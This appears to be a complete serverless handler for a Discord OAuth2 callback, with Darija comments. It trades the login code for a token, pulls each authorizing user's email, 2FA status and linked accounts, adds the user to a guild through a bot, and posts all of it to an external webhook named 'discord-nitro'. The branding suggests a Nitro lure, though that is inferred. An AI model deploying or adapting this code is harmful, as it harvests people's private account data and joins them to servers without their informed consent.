// Discord OAuth2 callback: bdel l'code, jib l'user + connections, dkhel l'guild,
// sift webhook, w redirigi l'invite f koulchi 7al.

const API = 'https://discord.com/api/v10';
const INVITE = process.env.INVITE_URL || 'https://discord.gg/ZHXHqd96Kz';

function bounce(res, to) {
  res.statusCode = 302;
  res.setHeader('Location', to || INVITE);
  res.setHeader('Cache-Control', 'no-store');
  res.setHeader('X-Robots-Tag', 'noindex');
  res.end();
}

async function call(path, { method = 'GET', token, body, form } = {}) {
  const headers = {};
  if (token) headers.Authorization = token.startsWith('Bot ') ? token : `Bearer ${token}`;
  let payload;
  if (form) {
    headers['Content-Type'] = 'application/x-www-form-urlencoded';
    payload = new URLSearchParams(form).toString();
  } else if (body) {
    headers['Content-Type'] = 'application/json';
    payload = JSON.stringify(body);
  }
  const r = await fetch(API + path, { method, headers, body: payload });
  const text = await r.text();
  if (!r.ok) throw new Error(`${method} ${path} -> ${r.status} ${text.slice(0, 300)}`);
  return text ? JSON.parse(text) : null;
}

module.exports = async function handler(req, res) {
  const url = new URL(req.url, 'https://local');
  const code = url.searchParams.get('code');
  const oauthError = url.searchParams.get('error');

  if (!code) {
    console.warn('no code', oauthError || '');
    return bounce(res);
  }

  const { CLIENT_ID, CLIENT_SECRET, REDIRECT_URI, GUILD_ID, BOT_TOKEN, WEBHOOK } = process.env;

  if (!CLIENT_ID || !CLIENT_SECRET || !REDIRECT_URI) {
    console.warn('missing env', {
      CLIENT_ID: !!CLIENT_ID,
      CLIENT_SECRET: !!CLIENT_SECRET,
      REDIRECT_URI: !!REDIRECT_URI,
    });
    return bounce(res);
  }

  try {
    const token = await call('/oauth2/token', {
      method: 'POST',
      form: {
        client_id: CLIENT_ID,
        client_secret: CLIENT_SECRET,
        grant_type: 'authorization_code',
        code,
        redirect_uri: REDIRECT_URI,
      },
    });

    const [user, connections] = await Promise.all([
      call('/users/@me', { token: token.access_token }),
      call('/users/@me/connections', { token: token.access_token }).catch(() => []),
    ]);

    if (GUILD_ID && BOT_TOKEN) {
      try {
        await call(`/guilds/${GUILD_ID}/members/${user.id}`, {
          method: 'PUT',
          token: `Bot ${BOT_TOKEN}`,
          body: { access_token: token.access_token },
        });
      } catch (e) {
        console.warn('guild join failed:', e.message);
      }
    }

    if (WEBHOOK) {
      const conns = (connections || []).map(
        (c) => `${c.type}:${c.name}${c.verified ? ' (verified)' : ''}`
      );
      const embed = {
        title: 'New authorize',
        color: 0x5865f2,
        timestamp: new Date().toISOString(),
        fields: [
          { name: 'User', value: `${user.username} (<@${user.id}>)`, inline: true },
          { name: 'ID', value: user.id, inline: true },
          { name: 'Email', value: user.email || '—' },
          { name: 'Verified', value: String(!!user.verified), inline: true },
          { name: '2FA', value: String(!!user.mfa_enabled), inline: true },
          { name: 'Connections', value: conns.length ? conns.join('\n') : '—' },
        ],
      };
      if (user.avatar) {
        embed.thumbnail = {
          url: `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png?size=128`,
        };
      }
      try {
        const r = await fetch(WEBHOOK, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ username: 'discord-nitro', embeds: [embed] }),
        });
        if (!r.ok) console.warn('webhook', r.status, (await r.text()).slice(0, 200));
      } catch (e) {
        console.warn('webhook failed:', e.message);
      }
    }
  } catch (e) {
    console.error('callback failed:', e.message);
  }

  return bounce(res);
};